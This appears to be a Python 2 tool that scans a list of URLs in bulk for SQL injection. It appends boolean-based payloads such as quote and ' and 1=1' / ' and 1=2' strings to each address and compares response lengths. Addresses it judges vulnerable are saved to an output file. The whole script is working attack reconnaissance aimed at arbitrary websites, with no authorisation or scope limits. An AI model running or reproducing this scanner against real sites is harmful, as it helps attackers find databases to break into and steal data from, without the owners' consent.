#coding:utf-8
import httplib
import urllib2
import this
"""
Depending on different databases, you could edit the test rules
"""
rules=[[
       "'",
       " and 1=1",
       " and 1=2"
      ],
      [
      "'",
      "' and '1'='1",
      "' and '1'='2" 
      ]]

def fk(strr):
    # conn = httplib.HTTPConnection(strr,80,False)
    # conn.request('GET', '/ReadNews.asp?NewsId=10046')
    # res=conn.getresponse()
    # print res.status(),strr
    strr=strr.rstrip('\n')
    #print strr
    try:
        len_ori=len(urllib2.urlopen(strr).read())
    except:
        return False
    for j in range(2):
        flag=0
        for i in rules[j]:
            gao=strr+i
            gao=gao.replace(" ","%20")
            data=urllib2.urlopen(gao).read()
            len_now=len(data)
            flag<<=1
            if(abs(len_now-len_ori)>100 and data.find("非法")==-1 and data.find("出错了")==-1): 
                flag+=1
        if(flag==5): 
            print "find" +" "+strr
            return True
    return False
        


if __name__ == "__main__":
    file1=open('ans_url.txt','r')
    file2=open('dan_url.txt','w')
    data=file1.readlines()
    for one in data:
        if(fk(one)):
            file2.writelines(one)
    file1.close()
    file2.flush();file2.close()
    input("done_check")
